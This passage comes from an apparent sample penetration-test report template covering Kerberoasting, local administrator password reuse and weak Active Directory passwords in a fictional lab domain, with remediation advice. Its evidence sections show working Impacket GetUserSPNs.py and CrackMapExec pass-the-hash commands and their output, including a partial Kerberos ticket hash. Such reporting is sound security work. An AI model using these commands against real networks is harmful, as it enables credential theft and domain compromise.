{"text": "for service accounts and rotate them periodically  Limit the privileges of service accounts and avoid creating SPNs tied to highly privileged accounts such as Domain Administrators External References https://attack.mitre.org/techniques/T1558/003/ Finding Evidence: Retrieving a listing all SPN accounts in the INLANEFREIGHT.LOCAL domain using the GetUserSPNs.py tool from the Impacket toolkit. $ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ------------------------------------------- --------- -------- -------------------------- --------- ---- ------ MSSQLSvc/SQL01.inlanefreight.local:1433 mssqlsvc 2022-05-13 16:52:07.280623 <never> MSSQLSvc/SQL02.inlanefreight.local:1433 sqlprod 2022-05-13 16:54:52.889815 <never> MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 sqldev 2022-05-13 16:54:57.905315 <never> MSSQLSvc/QA001.inlanefreight.local:1433 sqlqa 2022-05-13 16:55:03.421004 <never> backupjob/veam001.inlanefreight.local backupjob 2022-05-13 18:38:17.740269 <never> vmware/vc.inlanefreight.local vmwaresvc 2022-05-13 18:39:10.691799 <never> Figure 20: Kerberoasting - Listing SPN Accounts 20\\nTargeted Kerberoasting against the mssqlsvc account using the GetUserSPNs.py tool. $ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation --------------------------------------- -------- -------- -------------------------- --------- --------- - MSSQLSvc/SQL01.inlanefreight.local:1433 mssqlsvc 2022-05-13 16:52:07.280623 <never> $krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a39 88485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c 782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3 c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c4 4ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf6828 6ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a8971 85716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP> Figure 21: Targeted Kerberoasting 21\\n3. Local Administrator Password Re-Use - High CWE CWE-522 CVSS 3.1 Score 9.5 Description (Incl. Root All Windows servers in the domain were found to be using the same password for the built-in Cause) local Administrator account. If an attacker can compromise one host in the domain and retrieve the NTLM password hash for the built-in local Administrator account they could use this to access all hosts in the domain Security Impact using this same account, potentially leading to domain compromise or significant sensitive data disclosure. Affected Domain  INLANEFREIGHT.LOCAL Modify local administrator passwords on all affected hosts to be unique values. Consider a solution such as the Microsoft Local Administrator Password Solution (LAPS) to manage local Remediation administrator passwords centrally in Active Directory. This tool mitigates the risk of password re-use by assigning a different machine-generated randomized password to each host that changes automatically on a set interval. https://attack.mitre.org/techniques/T1558/003/ External References https://techcommunity.microsoft.com/t5/itops-talk-blog/step-by-step-guide-how-to- configure-microsoft-local/ba-p/2806185 Finding Evidence: Using the CrackMapExec tool to test for local administrator password re-use. The command below ensures that only one logon attempt is made per host to avoid account lockout. $ sudo crackmapexec smb --local-auth 192.168.195.0/24 -u administrator -H 31d6cfe0dxxxxxxxxxx9d7e0c089c0 | grep + SMB 192.168.195.205 445 MS01 [+] MS01\\administrator 31d6cfe0dxxxxxxxxxx9d7e0c089c0 SMB 192.168.195.220 445 SQL01 [+] SQL01\\administrator 31d6cfe0dxxxxxxxxxx9d7e0c089c0 Figure 22: Testing for Local Admin Password Re-Use 22\\n4. Weak Active Directory Passwords - High CWE CWE-521 CVSS 3.1 Score 9.5 The tester found that users were using common, weak, passwords within the Active Directory Description (Incl. Root domain and was able to uncover passwords for several users via a password spraying attack. Cause) Furthermore, an analysis of all domain passwords after achieving domain compromise showed more widespread weak password usage. An attacker may be able to use this to guess passwords and gain a foothold within the internal environment. If external services are set up with Active Directory authentication (such as VPN, Security Impact email, or remote application services) an attacker may be able to perform a targeted password spray", "metadata": {"doc_id": "Hack the Box - sample-penetration-testing-report-template", "chunk_id": 11}}